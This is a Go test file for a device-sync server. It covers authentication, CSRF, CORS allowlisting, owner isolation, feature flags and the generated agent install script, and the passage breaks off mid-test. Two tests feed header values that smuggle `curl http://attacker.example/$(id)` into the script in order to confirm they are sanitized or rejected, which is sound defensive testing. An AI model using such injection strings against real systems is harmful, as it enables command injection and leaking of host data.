package app

import (
	"bytes"
	"encoding/json"
	"errors"
	"fmt"
	"mime/multipart"
	"net/http"
	"net/http/httptest"
	"net/textproto"
	"net/url"
	"os"
	"path/filepath"
	"reflect"
	"strings"
	"testing"
	"time"

	"sync-win/server/internal/logging"
	"sync-win/server/internal/store"
	"sync-win/server/internal/tunnel"
)

func newTestServer(t *testing.T) *Server {
	t.Helper()
	st, err := store.NewStore(filepath.Join(t.TempDir(), "data"))
	if err != nil {
		t.Fatalf("open store: %v", err)
	}
	t.Cleanup(func() { st.Close() })

	// Initialize structured logger for tests
	logCfg := logging.DefaultConfig()
	logCfg.ConsoleLevel = logging.LevelError // Only show errors in tests
	logStore := logging.NewStore(st.DB())
	structLogger := logging.New(logCfg, logStore)
	t.Cleanup(func() { structLogger.Stop() })

	return &Server{store: st, logStore: logStore, log: structLogger, streamTickets: newStreamTicketStore(), rateLimiter: newRateLimiter(), tunnelHub: tunnel.NewHub(), flags: featureFlags{EnableRegistration: true}}
}

func TestAgentInstallScriptRegistersAndVerifies(t *testing.T) {
	s := newTestServer(t)
	s.flags.EnableLegacyInstall = true

	user, err := s.store.CreateUser("owner@example.com", "correct horse battery staple")
	if err != nil {
		t.Fatal(err)
	}
	session, err := s.store.CreateSession(user.ID)
	if err != nil {
		t.Fatal(err)
	}

	req := httptest.NewRequest(http.MethodGet, "/api/agent/install.sh?owner_id=not-authoritative&hostname=target-pc&user=alice", nil)
	req.Header.Set("Authorization", "Bearer "+session.Token)
	rec := httptest.NewRecorder()
	s.handleAgentInstallScript(rec, req)

	if rec.Code != http.StatusOK {
		t.Fatalf("status = %d, body = %s", rec.Code, rec.Body.String())
	}
	if ct := rec.Header().Get("Content-Type"); !strings.Contains(ct, "x-shellscript") {
		t.Fatalf("content type = %q", ct)
	}
	script := rec.Body.String()
	const marker = `DEVICE_TOKEN="`
	start := strings.Index(script, marker)
	if start < 0 {
		t.Fatal("install script has no device token")
	}
	start += len(marker)
	end := strings.Index(script[start:], `"`)
	if end <= 0 {
		t.Fatal("install script has an invalid device token")
	}
	if token := script[start : start+end]; isDeviceTokenDigest(token) {
		t.Fatalf("install script leaked the stored device-token hash: %q", token)
	}

	devices, err := s.store.ListDevicesForOwner(user.ID)
	if err != nil {
		t.Fatal(err)
	}
	if len(devices) != 1 {
		t.Fatalf("expected 1 registered device for session owner, got %d", len(devices))
	}
	device := devices[0]
	if device.Hostname != "target-pc" || device.UserID != "alice" {
		t.Fatalf("unexpected device: %+v", device)
	}

	for _, want := range []string{
		"#!/usr/bin/env bash",
		`SERVER_URL="http://example.com"`,
		`DEVICE_ID="` + device.ID + `"`,
		"/api/agent/download",
		"sync-win-agent.service",
		"Restart=always",
		"StartLimitIntervalSec=0",
		"Verifying connection to the server",
		"/api/devices/$DEVICE_ID/heartbeat",
		"SUCCESS - SyncWin agent installed AND connected",
		"could NOT reach the server",
		"journalctl --user -u sync-win-agent",
		"sync-win-agent-update.timer",
		"--user-systemd",
	} {
		if !strings.Contains(script, want) {
			t.Errorf("install script missing %q\nscript:\n%s", want, script)
		}
	}
	if strings.Contains(script, "%!s(") {
		t.Errorf("unformatted placeholder leaked into script:\n%s", script)
	}
}

func TestAuthMe(t *testing.T) {
	s := newTestServer(t)

	post := func(path string) *httptest.ResponseRecorder {
		req := httptest.NewRequest(http.MethodPost, path, strings.NewReader(`{"email":"joao@example.com","password":"supersecret1"}`))
		req.Header.Set("Content-Type", "application/json")
		rec := httptest.NewRecorder()
		s.handleAuthRegister(rec, req)
		return rec
	}
	if rec := post("/api/auth/register"); rec.Code != http.StatusOK {
		t.Fatalf("register failed: %s", rec.Body.String())
	}

	meReq := httptest.NewRequest(http.MethodGet, "/api/auth/me", nil)
	meRec := httptest.NewRecorder()
	s.handleAuthMe(meRec, meReq)
	if meRec.Code != http.StatusUnauthorized {
		t.Fatalf("me without token must be 401, got %d", meRec.Code)
	}

	loginReq := httptest.NewRequest(http.MethodPost, "/api/auth/login", strings.NewReader(`{"email":"joao@example.com","password":"supersecret1"}`))
	loginReq.Header.Set("Content-Type", "application/json")
	loginRec := httptest.NewRecorder()
	s.handleAuthLogin(loginRec, loginReq)
	if loginRec.Code != http.StatusOK {
		t.Fatalf("login failed: %s", loginRec.Body.String())
	}
	var auth struct {
		Token   string `json:"token"`
		OwnerID string `json:"owner_id"`
		Email   string `json:"email"`
	}
	if err := json.Unmarshal(loginRec.Body.Bytes(), &auth); err != nil {
		t.Fatal(err)
	}

	authedReq := httptest.NewRequest(http.MethodGet, "/api/auth/me", nil)
	authedReq.Header.Set("Authorization", "Bearer "+auth.Token)
	authedRec := httptest.NewRecorder()
	s.handleAuthMe(authedRec, authedReq)
	if authedRec.Code != http.StatusOK {
		t.Fatalf("me with token = %d: %s", authedRec.Code, authedRec.Body.String())
	}
	var me struct {
		OwnerID string `json:"owner_id"`
		Email   string `json:"email"`
	}
	if err := json.Unmarshal(authedRec.Body.Bytes(), &me); err != nil {
		t.Fatal(err)
	}
	if me.OwnerID != auth.OwnerID || me.Email != "joao@example.com" {
		t.Fatalf("unexpected me payload: %+v", me)
	}
}

func TestOwnerIDRequiresSession(t *testing.T) {
	s := newTestServer(t)
	user, err := s.store.CreateUser("owner-boundary@example.com", "correct horse battery staple")
	if err != nil {
		t.Fatal(err)
	}
	session, err := s.store.CreateSession(user.ID)
	if err != nil {
		t.Fatal(err)
	}

	req := httptest.NewRequest(http.MethodGet, "/api/devices?owner_id=query-owner", nil)
	req.Header.Set("X-SYNCWIN-Anonymous-ID", "header-owner")
	if got := s.ownerID(req); got != "" {
		t.Fatalf("untrusted owner hints must not authorize, got %q", got)
	}

	req.Header.Set("Authorization", "Bearer "+session.Token)
	if got := s.ownerID(req); got != user.ID {
		t.Fatalf("session owner = %q, want %q", got, user.ID)
	}
}

func TestOwnerIsolationAcrossDevicesAndLogs(t *testing.T) {
	s := newTestServer(t)
	ownerA, err := s.store.CreateUser("a@example.com", "correct horse battery staple")
	if err != nil {
		t.Fatal(err)
	}
	ownerB, err := s.store.CreateUser("b@example.com", "correct horse battery staple")
	if err != nil {
		t.Fatal(err)
	}
	sessionA, err := s.store.CreateSession(ownerA.ID)
	if err != nil {
		t.Fatal(err)
	}
	sessionB, err := s.store.CreateSession(ownerB.ID)
	if err != nil {
		t.Fatal(err)
	}
	deviceA, err := s.store.RegisterDevice("pc-a", ownerA.ID, ownerA.ID, "")
	if err != nil {
		t.Fatal(err)
	}
	deviceB, err := s.store.RegisterDevice("pc-b", ownerB.ID, ownerB.ID, "")
	if err != nil {
		t.Fatal(err)
	}

	listReq := httptest.NewRequest(http.MethodGet, "/api/devices", nil)
	listReq.Header.Set("Authorization", "Bearer "+sessionA.Token)
	listRec := httptest.NewRecorder()
	s.handleDevices(listRec, listReq)
	if listRec.Code != http.StatusOK {
		t.Fatalf("list devices: %d %s", listRec.Code, listRec.Body.String())
	}
	var listed []struct{ ID, OwnerID string }
	if err := json.Unmarshal(listRec.Body.Bytes(), &listed); err != nil {
		t.Fatal(err)
	}
	if len(listed) != 1 || listed[0].ID != deviceA.ID {
		t.Fatalf("owner A saw another owner's devices: %+v", listed)
	}

	crossReq := httptest.NewRequest(http.MethodGet, "/api/devices/"+deviceA.ID+"/detail", nil)
	crossReq.Header.Set("Authorization", "Bearer "+sessionB.Token)
	crossRec := httptest.NewRecorder()
	s.handleDeviceDetailFull(crossRec, crossReq, deviceA.ID)
	if crossRec.Code != http.StatusNotFound {
		t.Fatalf("cross-owner detail status = %d, want 404", crossRec.Code)
	}

	if err := s.logStore.WriteSingle(&logging.LogEntry{Timestamp: time.Now(), Level: logging.LevelInfo, Category: logging.CatDevice, Event: logging.EventDeviceUpdated, Message: "owner-a-only", DeviceID: deviceA.ID}); err != nil {
		t.Fatal(err)
	}
	logReq := httptest.NewRequest(http.MethodGet, "/api/logs", nil)
	logReq.Header.Set("Authorization", "Bearer "+sessionB.Token)
	logRec := httptest.NewRecorder()
	s.handleLogs(logRec, logReq)
	if logRec.Code != http.StatusOK {
		t.Fatalf("logs: %d %s", logRec.Code, logRec.Body.String())
	}
	if strings.Contains(logRec.Body.String(), "owner-a-only") {
		t.Fatal("owner B received owner A's log entry")
	}
	_ = deviceB
}

func TestCookieSessionAndCSRF(t *testing.T) {
	s := newTestServer(t)
	register := httptest.NewRequest(http.MethodPost, "/api/auth/register", strings.NewReader(`{"email":"cookie@example.com","password":"correct horse battery staple"}`))
	register.Header.Set("Content-Type", "application/json")
	registerRec := httptest.NewRecorder()
	s.handleAuthRegister(registerRec, register)
	if registerRec.Code != http.StatusOK {
		t.Fatalf("register: %d %s", registerRec.Code, registerRec.Body.String())
	}
	var authPayload struct {
		Token string `json:"token"`
	}
	if err := json.Unmarshal(registerRec.Body.Bytes(), &authPayload); err != nil {
		t.Fatal(err)
	}
	var sessionCookie, csrfCookie *http.Cookie
	for _, cookie := range registerRec.Result().Cookies() {
		switch cookie.Name {
		case sessionCookieName:
			sessionCookie = cookie
		case csrfCookieName:
			csrfCookie = cookie
		}
	}
	if sessionCookie == nil || csrfCookie == nil {
		t.Fatalf("expected session and CSRF cookies, got %#v", registerRec.Result().Cookies())
	}

	meReq := httptest.NewRequest(http.MethodGet, "/api/auth/me", nil)
	meReq.AddCookie(sessionCookie)
	meRec := httptest.NewRecorder()
	s.handleAuthMe(meRec, meReq)
	if meRec.Code != http.StatusOK {
		t.Fatalf("cookie session status = %d", meRec.Code)
	}

	protected := csrfMiddleware(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) { w.WriteHeader(http.StatusNoContent) }))
	noCSRF := httptest.NewRequest(http.MethodPost, "/api/sync-config", nil)
	noCSRF.AddCookie(sessionCookie)
	noCSRFRec := httptest.NewRecorder()
	protected.ServeHTTP(noCSRFRec, noCSRF)
	if noCSRFRec.Code != http.StatusForbidden {
		t.Fatalf("missing CSRF status = %d, want 403", noCSRFRec.Code)
	}
	withCSRF := httptest.NewRequest(http.MethodPost, "/api/sync-config", nil)
	withCSRF.AddCookie(sessionCookie)
	withCSRF.AddCookie(csrfCookie)
	withCSRF.Header.Set(csrfHeaderName, csrfCookie.Value)
	withCSRFRec := httptest.NewRecorder()
	protected.ServeHTTP(withCSRFRec, withCSRF)
	if withCSRFRec.Code != http.StatusNoContent {
		t.Fatalf("valid CSRF status = %d, want 204", withCSRFRec.Code)
	}
	_ = authPayload
}

func TestAuthUpdateEmail(t *testing.T) {
	s := newTestServer(t)

	// Register a user
	regBody := `{"email":"test@example.com","password":"password123"}`
	regReq := httptest.NewRequest(http.MethodPost, "/api/auth/register", strings.NewReader(regBody))
	regReq.Header.Set("Content-Type", "application/json")
	regRec := httptest.NewRecorder()
	s.handleAuthRegister(regRec, regReq)
	if regRec.Code != http.StatusOK {
		t.Fatalf("register failed: %d %s", regRec.Code, regRec.Body.String())
	}
	var regPayload map[string]string
	json.NewDecoder(regRec.Body).Decode(&regPayload)
	token := regPayload["token"]

	// Update email
	emailBody := `{"email":"new@example.com"}`
	emailReq := httptest.NewRequest(http.MethodPost, "/api/auth/update-email", strings.NewReader(emailBody))
	emailReq.Header.Set("Content-Type", "application/json")
	emailReq.Header.Set("Authorization", "Bearer "+token)
	emailRec := httptest.NewRecorder()
	s.handleAuthUpdateEmail(emailRec, emailReq)
	if emailRec.Code != http.StatusOK {
		t.Fatalf("update email failed: %d %s", emailRec.Code, emailRec.Body.String())
	}

	// Verify new email via /api/auth/me
	meReq := httptest.NewRequest(http.MethodGet, "/api/auth/me", nil)
	meReq.Header.Set("Authorization", "Bearer "+token)
	meRec := httptest.NewRecorder()
	s.handleAuthMe(meRec, meReq)
	var mePayload map[string]string
	json.NewDecoder(meRec.Body).Decode(&mePayload)
	if mePayload["email"] != "new@example.com" {
		t.Fatalf("expected email new@example.com, got %q", mePayload["email"])
	}
}

func TestAuthUpdatePassword(t *testing.T) {
	s := newTestServer(t)

	// Register
	regBody := `{"email":"pwd@example.com","password":"oldpassword"}`
	regReq := httptest.NewRequest(http.MethodPost, "/api/auth/register", strings.NewReader(regBody))
	regReq.Header.Set("Content-Type", "application/json")
	regRec := httptest.NewRecorder()
	s.handleAuthRegister(regRec, regReq)
	if regRec.Code != http.StatusOK {
		t.Fatalf("register failed: %d %s", regRec.Code, regRec.Body.String())
	}
	var regPayload map[string]string
	json.NewDecoder(regRec.Body).Decode(&regPayload)
	token := regPayload["token"]

	// Update password
	pwdBody := `{"current_password":"oldpassword","new_password":"newpassword123"}`
	pwdReq := httptest.NewRequest(http.MethodPost, "/api/auth/update-password", strings.NewReader(pwdBody))
	pwdReq.Header.Set("Content-Type", "application/json")
	pwdReq.Header.Set("Authorization", "Bearer "+token)
	pwdRec := httptest.NewRecorder()
	s.handleAuthUpdatePassword(pwdRec, pwdReq)
	if pwdRec.Code != http.StatusNoContent {
		t.Fatalf("update password failed: %d %s", pwdRec.Code, pwdRec.Body.String())
	}

	// Login with new password
	loginBody := `{"email":"pwd@example.com","password":"newpassword123"}`
	loginReq := httptest.NewRequest(http.MethodPost, "/api/auth/login", strings.NewReader(loginBody))
	loginReq.Header.Set("Content-Type", "application/json")
	loginRec := httptest.NewRecorder()
	s.handleAuthLogin(loginRec, loginReq)
	if loginRec.Code != http.StatusOK {
		t.Fatalf("login with new password failed: %d %s", loginRec.Code, loginRec.Body.String())
	}
}

func TestMergeConfigsPreservesMaskedFields(t *testing.T) {
	existing := json.RawMessage(`{"bot_token":"secret-token-123","chat_id":"9999"}`)
	incoming := json.RawMessage(`{"chat_id":"8888","bot_token":"***"}`)

	merged := mergeConfigs(existing, incoming)

	var result map[string]string
	if err := json.Unmarshal(merged, &result); err != nil {
		t.Fatalf("merge failed: %v", err)
	}
	if result["bot_token"] != "secret-token-123" {
		t.Errorf("expected bot_token preserved, got %q", result["bot_token"])
	}
	if result["chat_id"] != "8888" {
		t.Errorf("expected chat_id updated, got %q", result["chat_id"])
	}
}

func TestMergeConfigsHandlesNewFields(t *testing.T) {
	existing := json.RawMessage(`{"chat_id":"9999"}`)
	incoming := json.RawMessage(`{"chat_id":"8888","webhook_url":"https://example.com"}`)

	merged := mergeConfigs(existing, incoming)

	var result map[string]string
	if err := json.Unmarshal(merged, &result); err != nil {
		t.Fatalf("merge failed: %v", err)
	}
	if result["chat_id"] != "8888" {
		t.Errorf("expected chat_id updated, got %q", result["chat_id"])
	}
	if result["webhook_url"] != "https://example.com" {
		t.Errorf("expected webhook_url added, got %q", result["webhook_url"])
	}
}

func TestMergeConfigsNoExisting(t *testing.T) {
	incoming := json.RawMessage(`{"chat_id":"8888"}`)

	merged := mergeConfigs(nil, incoming)

	var result map[string]string
	if err := json.Unmarshal(merged, &result); err != nil {
		t.Fatalf("merge failed: %v", err)
	}
	if result["chat_id"] != "8888" {
		t.Errorf("expected chat_id, got %q", result["chat_id"])
	}
}

func TestAuthUpdatePasswordWrongCurrent(t *testing.T) {
	s := newTestServer(t)

	// Register
	regBody := `{"email":"wrong@example.com","password":"correctpass"}`
	regReq := httptest.NewRequest(http.MethodPost, "/api/auth/register", strings.NewReader(regBody))
	regReq.Header.Set("Content-Type", "application/json")
	regRec := httptest.NewRecorder()
	s.handleAuthRegister(regRec, regReq)
	var regPayload map[string]string
	json.NewDecoder(regRec.Body).Decode(&regPayload)
	token := regPayload["token"]

	// Try update with wrong current password
	pwdBody := `{"current_password":"wrongpass","new_password":"newpassword123"}`
	pwdReq := httptest.NewRequest(http.MethodPost, "/api/auth/update-password", strings.NewReader(pwdBody))
	pwdReq.Header.Set("Content-Type", "application/json")
	pwdReq.Header.Set("Authorization", "Bearer "+token)
	pwdRec := httptest.NewRecorder()
	s.handleAuthUpdatePassword(pwdRec, pwdReq)
	if pwdRec.Code != http.StatusBadRequest {
		t.Fatalf("expected 400 for wrong password, got %d", pwdRec.Code)
	}
}

func TestRemoteMutationClassification(t *testing.T) {
	for _, cmdType := range []string{"install_app", "restore_saves", "exclude_file"} {
		if !isRemoteMutationCommand(cmdType) {
			t.Errorf("%s should be classified as a remote mutation", cmdType)
		}
	}
	if isRemoteMutationCommand("lynis_audit") {
		t.Error("lynis_audit should not be classified as a remote mutation")
	}
}

func TestFeatureFlagsFailClosed(t *testing.T) {
	t.Setenv("SYNCWIN_ENABLE_FINGERPRINT_RECONNECT", "")
	t.Setenv("SYNCWIN_ENABLE_LEGACY_INSTALL", "")
	t.Setenv("SYNCWIN_ENABLE_REMOTE_MUTATIONS", "")
	t.Setenv("SYNCWIN_ENABLE_DOCKER_MUTATIONS", "")
	t.Setenv("SYNCWIN_ENABLE_REGISTRATION", "")

	flags := loadFeatureFlags()
	if flags.EnableFingerprintReconnect || flags.EnableLegacyInstall || flags.EnableRemoteMutations || flags.EnableDockerMutations || flags.EnableRegistration {
		t.Fatalf("security feature flags must default to false: %#v", flags)
	}
}

func TestRegistrationDisabledByDefault(t *testing.T) {
	s := newTestServer(t)
	s.flags.EnableRegistration = false

	req := httptest.NewRequest(http.MethodPost, "/api/auth/register", strings.NewReader(`{"email":"public@example.com","password":"supersecret1"}`))
	req.Header.Set("Content-Type", "application/json")
	rec := httptest.NewRecorder()
	s.handleAuthRegister(rec, req)

	if rec.Code != http.StatusForbidden {
		t.Fatalf("registration must be 403 when disabled, got %d: %s", rec.Code, rec.Body.String())
	}
}

func TestAuthConfigExposesRegistrationFlag(t *testing.T) {
	s := newTestServer(t)

	s.flags.EnableRegistration = true
	rec := httptest.NewRecorder()
	s.handleAuthConfig(rec, httptest.NewRequest(http.MethodGet, "/api/auth/config", nil))
	var payload map[string]bool
	if err := json.Unmarshal(rec.Body.Bytes(), &payload); err != nil {
		t.Fatalf("decode config: %v", err)
	}
	if !payload["registration_enabled"] {
		t.Fatalf("expected registration_enabled=true, got %v", payload)
	}

	s.flags.EnableRegistration = false
	rec = httptest.NewRecorder()
	s.handleAuthConfig(rec, httptest.NewRequest(http.MethodGet, "/api/auth/config", nil))
	if err := json.Unmarshal(rec.Body.Bytes(), &payload); err != nil {
		t.Fatalf("decode config: %v", err)
	}
	if payload["registration_enabled"] {
		t.Fatalf("expected registration_enabled=false, got %v", payload)
	}
}

func TestBootstrapAdminCreatesAndPreservesAccount(t *testing.T) {
	s := newTestServer(t)
	t.Setenv("SYNCWIN_ADMIN_EMAIL", "admin@example.com")
	t.Setenv("SYNCWIN_ADMIN_PASSWORD", "correct horse battery staple")

	bootstrapAdmin(s.store, s.log, false)
	user, err := s.store.AuthenticateUser("admin@example.com", "correct horse battery staple")
	if err != nil {
		t.Fatalf("admin login: %v", err)
	}

	// The environment password must never overwrite an account that already
	// exists, so a password changed in the dashboard survives restarts.
	if err := s.store.UpdateUserPassword(user.ID, "correct horse battery staple", "changed-password-123"); err != nil {
		t.Fatalf("change password: %v", err)
	}
	bootstrapAdmin(s.store, s.log, false)
	if _, err := s.store.AuthenticateUser("admin@example.com", "correct horse battery staple"); err == nil {
		t.Fatal("bootstrap must not reset an existing password")
	}
	if _, err := s.store.AuthenticateUser("admin@example.com", "changed-password-123"); err != nil {
		t.Fatalf("changed password should still work: %v", err)
	}
}

func TestLegacyInstallDisabledByDefault(t *testing.T) {
	s := newTestServer(t)
	req := httptest.NewRequest(http.MethodGet, "/api/agent/install.sh", nil)
	rec := httptest.NewRecorder()

	s.handleAgentInstallScript(rec, req)

	if rec.Code != http.StatusGone {
		t.Fatalf("expected 410 for disabled legacy installer, got %d", rec.Code)
	}
}

func TestFingerprintReconnectDisabledByDefault(t *testing.T) {
	s := newTestServer(t)
	req := httptest.NewRequest(http.MethodPost, "/api/agent/reconnect", strings.NewReader(`{"fingerprint":"abc"}`))
	rec := httptest.NewRecorder()

	s.handleReconnect(rec, req)

	if rec.Code != http.StatusGone {
		t.Fatalf("expected 410 for disabled fingerprint reconnect, got %d", rec.Code)
	}
}

func TestSecurityHeadersAndCORS(t *testing.T) {
	// The dashboard is served from the same origin in production, so an empty
	// allowlist must emit no CORS origin at all.
	t.Setenv("SYNCWIN_CORS_ALLOWED_ORIGIN", "")
	req := httptest.NewRequest(http.MethodGet, "/health", nil)
	rec := httptest.NewRecorder()

	securityHeadersMiddleware(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		setCORSHeaders(w, r)
		w.WriteHeader(http.StatusOK)
	})).ServeHTTP(rec, req)

	if got := rec.Header().Get("X-Content-Type-Options"); got != "nosniff" {
		t.Fatalf("X-Content-Type-Options = %q", got)
	}
	if got := rec.Header().Get("X-Frame-Options"); got != "DENY" {
		t.Fatalf("X-Frame-Options = %q", got)
	}
	if got := rec.Header().Get("Access-Control-Allow-Origin"); got != "" {
		t.Fatalf("unexpected default CORS origin %q", got)
	}
}

// A dashboard reachable under several names must get a matching header for each
// of them. The previous implementation always answered with a single fixed
// origin, so opening the same dev server through 127.0.0.1 instead of localhost
// produced a mismatch the browser reports as a CORS error.
func TestCORSEchoesTheRequestOriginFromAllowlist(t *testing.T) {
	t.Setenv("SYNCWIN_CORS_ALLOWED_ORIGIN", "http://localhost:5173, http://127.0.0.1:5173")

	for _, origin := range []string{"http://localhost:5173", "http://127.0.0.1:5173"} {
		req := httptest.NewRequest(http.MethodGet, "/health", nil)
		req.Header.Set("Origin", origin)
		rec := httptest.NewRecorder()
		setCORSHeaders(rec, req)
		if got := rec.Header().Get("Access-Control-Allow-Origin"); got != origin {
			t.Errorf("origin %q: got %q", origin, got)
		}
		if got := rec.Header().Get("Access-Control-Allow-Credentials"); got != "true" {
			t.Errorf("origin %q: credentials = %q", origin, got)
		}
	}
}

// Echoing an origin that is not allowlisted would let any site send credentialed
// requests against the session cookie, so the header must be omitted entirely.
func TestCORSRejectsUnlistedOrigin(t *testing.T) {
	t.Setenv("SYNCWIN_CORS_ALLOWED_ORIGIN", "http://localhost:5173")
	req := httptest.NewRequest(http.MethodGet, "/health", nil)
	req.Header.Set("Origin", "https://evil.example.com")
	rec := httptest.NewRecorder()
	setCORSHeaders(rec, req)
	if got := rec.Header().Get("Access-Control-Allow-Origin"); got != "" {
		t.Fatalf("unlisted origin was echoed: %q", got)
	}
}

// A wildcard cannot be combined with credentials, so it is rejected outright
// rather than silently reflected.
func TestCORSRejectsWildcardAndMalformedEntries(t *testing.T) {
	for _, value := range []string{"*", "http://localhost:5173, *", "not-a-url", "ftp://localhost:5173", "http://user:pw@localhost:5173"} {
		t.Setenv("SYNCWIN_CORS_ALLOWED_ORIGIN", value)
		if allowed := allowedOrigins(); len(allowed) != 0 {
			t.Errorf("%q produced allowlist %v, want empty", value, allowed)
		}
	}
}

func TestInternalErrorsAreNotExposed(t *testing.T) {
	s := newTestServer(t)
	rec := httptest.NewRecorder()
	s.writeError(rec, http.StatusInternalServerError, errors.New("sqlite: secret internal detail"))
	if body := rec.Body.String(); strings.Contains(body, "secret internal detail") {
		t.Fatalf("internal error leaked: %s", body)
	}
}

// TestAgentInstallScriptIgnoresHostileSchemeHeader ensures an attacker-supplied
// X-Forwarded-Proto cannot inject shell fragments into the generated script.
func TestAgentInstallScriptIgnoresHostileSchemeHeader(t *testing.T) {
	s := newTestServer(t)
	s.flags.EnableLegacyInstall = true

	user, err := s.store.CreateUser("scheme@example.com", "correct horse battery staple")
	if err != nil {
		t.Fatal(err)
	}
	session, err := s.store.CreateSession(user.ID)
	if err != nil {
		t.Fatal(err)
	}

	req := httptest.NewRequest(http.MethodGet, "/api/agent/install.sh", nil)
	req.Header.Set("Authorization", "Bearer "+session.Token)
	req.Header.Set("X-Forwarded-Proto", `https"; curl http://attacker.example/$(id); echo "`)
	rec := httptest.NewRecorder()
	s.handleAgentInstallScript(rec, req)

	if rec.Code != http.StatusOK {
		t.Fatalf("status = %d, body = %s", rec.Code, rec.Body.String())
	}
	script := rec.Body.String()
	if !strings.Contains(script, `SERVER_URL="http://example.com"`) {
		t.Fatalf("expected sanitized server URL, script:\n%s", script)
	}
	if strings.Contains(script, "attacker.example") {
		t.Fatalf("hostile header leaked into script:\n%s", script)
	}
}

// TestAgentInstallScriptRejectsHostileHost ensures a hostile Host header is
// rejected instead of being reflected into the install script.
func TestAgentInstallScriptRejectsHostileHost(t *testing.T) {
	s := newTestServer(t)
	s.flags.EnableLegacyInstall = true

	user, err := s.store.CreateUser("host@example.com", "correct horse battery staple")
	if err != nil {
		t.Fatal(err)
	}
	session, err := s.store.CreateSession(user.ID)
	if err != nil {
		t.Fatal(err)
	}

	req := httptest.NewRequest(http.MethodGet, "/api/agent/install.sh", nil)
	req.Header.Set("Authorization", "Bearer "+session.Token)
	req.Host = `evil.com"; curl http://attacker.example/$(id); echo "`
	rec := httptest.NewRecorder()
	s.handleAgentInstallScript(rec, req)

	if rec.Code != http.StatusBadRequest {
		t.Fatalf("expected 400 for hostile host, got %d: %s", rec.Code, rec.Body.String())
	}
}

// buildMultipart encodes a single file part for the attachment upload endpoint.
func buildMultipart(t *testing.T, filename, contentType string, data []byte) (*bytes.Buffer, string) {
	t.Helper()
	var buf bytes.Buffer
	mw := multipart.NewWriter(&buf)
	header := make(textproto.MIMEHeader)
	header.Set("Content-Disposition", fmt.Sprintf(`form-data; name="file"; filename="%s"`, filename))
	header.Set("Content-Type", contentType)
	part, err := mw.CreatePart(header)
	if err != nil {
		t.Fatal(err)
	}
	if _, err := part.Write(data); err != nil {
		t.Fatal(err)
	}
	if err := mw.Close(); err != nil {
		t.Fatal(err)
	}
	return &buf, mw.FormDataContentType()
}

func uploadAttachment(t *testing.T, s *Server, deviceID, token string, body *bytes.Buffer, contentType string) *httptest.ResponseRecorder {
	t.Helper()
	req := httptest.NewRequest(http.MethodPost, "/api/devices/"+deviceID+"/attachments", body)
	req.Header.Set("Content-Type", contentType)
	req.Header.Set("Authorization", "Bearer "+token)
	rec := httptest.NewRecorder()
	// Exercise the real middleware chain: the global JSON cap must not clamp
	// attachment uploads to 2 MB.
	limitBody(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		s.handleDeviceAttachments(w, r, deviceID)
	})).ServeHTTP(rec, req)
	return rec
}

func newAuthedDevice(t *testing.T, s *Server, email string) (ownerID, token, deviceID string) {
	t.Helper()
	user, err := s.store.CreateUser(email, "correct horse battery staple")
	if err != nil {
		t.Fatal(err)
	}
	session, err := s.store.CreateSession(user.ID)
	if err != nil {
		t.Fatal(err)
	}
	device, err := s.store.RegisterDevice("pc-"+email, "", user.ID, "")
	if err != nil {
		t.Fatal(err)
	}
	return user.ID, session.Token, device.ID
}

func TestCommandStatusAllowsOwnerAndDeviceToken(t *testing.T) {
	s := newTestServer(t)
	ownerID, sessionToken, _ := newAuthedDevice(t, s, "command-owner@example.com")
	device, err := s.store.RegisterDevice("command-pc", "", ownerID, "")
	if err != nil {
		t.Fatal(err)
	}
	command, err := s.store.QueueCommand(device.ID, "lynis_audit", "", "", "", "")
	if err != nil {
		t.Fatal(err)
	}

	for _, test := range []struct {
		name  string
		token string
	}{
		{name: "owner session", token: sessionToken},
		{name: "device token", token: device.DeviceToken},
	} {
		t.Run(test.name, func(t *testing.T) {
			req := httptest.NewRequest(http.MethodGet, "/api/devices/"+device.ID+"/commands/"+command.ID, nil)
			req.Header.Set("Authorization", "Bearer "+test.token)
			rec := httptest.NewRecorder()
			s.handleCommandStatus(rec, req, device.ID, command.ID)
			if rec.Code != http.StatusOK {
				t.Fatalf("status = %d, body = %s", rec.Code, rec.Body.String())
			}
			var got store.DeviceCommand
			if uerr := json.Unmarshal(rec.Body.Bytes(), &got); uerr != nil {
				t.Fatal(uerr)
			}
			if got.ID != command.ID || got.Status != "queued" {
				t.Fatalf("unexpected command status: %+v", got)
			}
		})
	}

	otherUser, err := s.store.CreateUser("other-command-owner@example.com", "correct horse battery staple")
	if err != nil {
		t.Fatal(err)
	}
	otherSession, err := s.store.CreateSession(otherUser.ID)
	if err != nil {
		t.Fatal(err)
	}
	req := httptest.NewRequest(http.MethodGet, "/api/devices/"+device.ID+"/commands/"+command.ID, nil)
	req.Header.Set("Authorization", "Bearer "+otherSession.Token)
	rec := httptest.NewRecorder()
	s.handleCommandStatus(rec, req, device.ID, command.ID)
	if rec.Code != http.StatusUnauthorized {
		t.Fatalf("foreign owner status = %d, want 401", rec.Code)
	}
}

func TestLynisCommandCompletesOnlyAfterReportIsSaved(t *testing.T) {
	s := newTestServer(t)
	ownerID, sessionToken, _ := newAuthedDevice(t, s, "lynis-command@example.com")
	device, err := s.store.RegisterDevice("lynis-pc", "", ownerID, "")
	if err != nil {
		t.Fatal(err)
	}
	command, err := s.store.QueueCommand(device.ID, "lynis_audit", "", "", "", "")
	if err != nil {
		t.Fatal(err)
	}

	report := `{"hardening_index":72,"total_warnings":1,"total_suggestions":2,"total_tests":10,"tests_passed":8,"lynis_version":"3.1","os":"Linux","kernel":"6.1"}`
	body, _ := json.Marshal(commandResultRequest{DeviceToken: device.DeviceToken, Status: "completed", Message: report})
	req := httptest.NewRequest(http.MethodPost, "/api/devices/"+device.ID+"/commands/"+command.ID, bytes.NewReader(body))
	rec := httptest.NewRecorder()
	s.handleCommandResult(rec, req, device.ID, command.ID)
	if rec.Code != http.StatusNoContent {
		t.Fatalf("result status = %d, body = %s", rec.Code, rec.Body.String())
	}

	statusReq := httptest.NewRequest(http.MethodGet, "/api/devices/"+device.ID+"/commands/"+command.ID, nil)
	statusReq.Header.Set("Authorization", "Bearer "+sessionToken)
	statusRec := httptest.NewRecorder()
	s.handleCommandStatus(statusRec, statusReq, device.ID, command.ID)
	var got store.DeviceCommand
	if uerr := json.Unmarshal(statusRec.Body.Bytes(), &got); uerr != nil {
		t.Fatal(uerr)
	}
	if got.Status != "completed" {
		t.Fatalf("command status = %q, want completed", got.Status)
	}
	audits, err := s.store.GetSecurityAudits(device.ID, 1)
	if err != nil || len(audits) != 1 || audits[0].HardeningIndex != 72 {
		t.Fatalf("saved audits = %+v, err = %v", audits, err)
